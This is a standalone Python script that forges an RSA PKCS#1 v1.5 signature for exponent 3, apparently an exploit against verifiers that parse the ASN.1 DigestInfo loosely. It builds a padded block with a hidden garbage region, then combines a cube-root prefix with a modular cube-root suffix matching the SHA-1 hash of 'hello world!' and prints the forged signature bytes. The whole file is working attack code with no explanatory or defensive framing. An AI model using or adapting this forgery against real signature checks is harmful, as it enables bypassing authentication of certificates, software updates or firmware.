#!/usr/bin/env python3

import sys
import hashlib

import mpmath
mpmath.mp.dps = 2048

n = 0xE932AC92252F585B3A80A4DD76A897C8B7652952FE788F6EC8DD640587A1EE5647670A8AD4C2BE0F9FA6E49C605ADF77B5174230AF7BD50E5D6D6D6D28CCF0A886A514CC72E51D209CC772A52EF419F6A953F3135929588EBE9B351FCA61CED78F346FE00DBB6306E5C2A4C6DFC3779AF85AB417371CF34D8387B9B30AE46D7A5FF5A655B8D8455F1B94AE736989D60A6F2FD5CADBFFBD504C5A756A2E6BB5CECC13BCA7503F6DF8B52ACE5C410997E98809DB4DC30D943DE4E812A47553DCE54844A78E36401D13F77DC650619FED88D8B3926E3D8E319C80C744779AC5D6ABE252896950917476ECE5E8FC27D5F053D6018D91B502C4787558A002B9283DA7

MODULUS_SIZE_IN_BYTES = 2048 // 8
MSG = b"hello world!"


def find_atk_prefix(prefixBytes, ignoreTrail):
    m = int(prefixBytes, 16)
    c = int(mpmath.ceil(mpmath.cbrt(m)))
    cb = int(mpmath.floor(mpmath.power(c, 3)))
    found = False
    strip = int(mpmath.floor(mpmath.log(c, b=2)))
    # print('cb =', hex(cb))
    if cb == m:
        return c
    while not found:
        # print('strip =', strip)
        d = int(mpmath.floor(mpmath.power(2, strip)))
        new_c = (c // d + 1) * d
        # print(hex(new_c))
        new_cb = int(mpmath.floor(mpmath.power(new_c, 3)))
        # print('hex(new_cb) =', hex(new_cb))
        # print('     hex(m) =', hex(m))
        if new_cb // ignoreTrail == m // ignoreTrail:
            return new_c
        strip -= 1

def eea_inverse(a, n):
    t = 0;  newt = 1
    r = n;  newr = a
    while newr != 0:
        q = r // newr
        (t, newt) = ( newt, t - q * newt )
        (r, newr) = ( newr, r - q * newr )
    if r > 1:
        return
    if t < 0:
        t = t + n
    return t

garbage_size = MODULUS_SIZE_IN_BYTES
garbage_size -= 2  # T, L for hash value
garbage_size -= 20 # length of SHA-1 hash
garbage_size -= 7  # TLV of SHA-1 OID
garbage_size -= 11 # 00 01 PS 00
garbage_size -= 2  # 2 Ts of the two SEQUENCE
garbage_size -= 4  # 2 Ls for the two SEQUENCE

lenSeq2 = garbage_size + 7
lenSeq1 = lenSeq2 + 20 + 2 + 3

tbs_str1 = "" \
        + "00" \
        + "01" \
        + "FF" * 8 \
        + "00" \
        + "3081" \
        + hex(lenSeq1)[2:] \
        + "3081" \
        + hex(lenSeq2)[2:] \
        + "06052b0e03021a" \
        + "00" * (garbage_size + 22)

tbs_str2 = "" \
        + "0414" \
        + hashlib.sha1(MSG).hexdigest()

match_size = len(tbs_str2) // 2

print("tbs_str2", tbs_str2)

# convert the hex string into integer
tbs2 = int(tbs_str2, 16)

n_prime = 2 ** (match_size * 8)
phi_n_prime = 2 ** (match_size * 8 - 1)

f = eea_inverse(3, phi_n_prime)

S2 = pow(tbs2, f, n_prime)
S1 = find_atk_prefix(tbs_str1, 2**((garbage_size+22)*8))

forged_sig = S1 + S2

print(hex(forged_sig))

for ab in int.to_bytes(forged_sig, MODULUS_SIZE_IN_BYTES, "big"):
    print("0x{:02x}, ".format(ab), end="")
print()

sig_out = pow(S2+S1, 3, n)
for ab in int.to_bytes(sig_out, MODULUS_SIZE_IN_BYTES, "big"):
    if False:
        print("failed")
        break
    else:
        print("{:02x}".format(ab), end="")
